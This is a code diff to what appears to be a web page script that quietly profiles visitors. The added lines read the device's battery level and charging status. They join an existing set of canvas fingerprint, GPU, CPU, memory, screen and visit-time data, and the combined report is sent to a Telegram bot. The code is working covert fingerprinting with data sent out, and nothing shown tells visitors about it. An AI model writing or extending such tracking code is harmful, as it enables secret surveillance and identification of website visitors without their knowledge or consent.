@@ -428,6 +428,18 @@
                 let timeStr = new Date().toLocaleString();
                 let canvasFP = getCanvasFingerprint();
                 let gpuInfo = getGPUInfo();
+
+                // 获取电池信息
+                let batteryInfo = "未获取/不支持";
+                if (navigator.getBattery) {
+                    try {
+                        let battery = await navigator.getBattery();
+                        let level = Math.floor(battery.level * 100);
+                        let chargingStatus = battery.charging ? "充电中 ⚡" : "未充电";
+                        batteryInfo = `${level}% (${chargingStatus})`;
+                    } catch (e) {}
+                }
+
                 let screenRes = `${window.screen.width} x ${window.screen.height}`;
                 let colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "深色模式 (Dark)" : "浅色模式 (Light)";
                 let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} 核` : "未知";
@@ -442,6 +454,7 @@
                                 `⚙️ <b>硬件配置:</b> CPU ${cpuCores} | 内存 ${memorySize}\n` +
                                 `🎮 <b>显卡渲染:</b> ${gpuInfo}\n` +
                                 `🖥 <b>屏幕/主题:</b> ${screenRes} [${colorScheme}]\n` +
+                                `⚡️ <b>电池状态:</b> ${batteryInfo}\n` +
                                 `🕒 <b>访问时间:</b> ${timeStr}`;
 
                 let isSent = await sendTelegram(visitText);
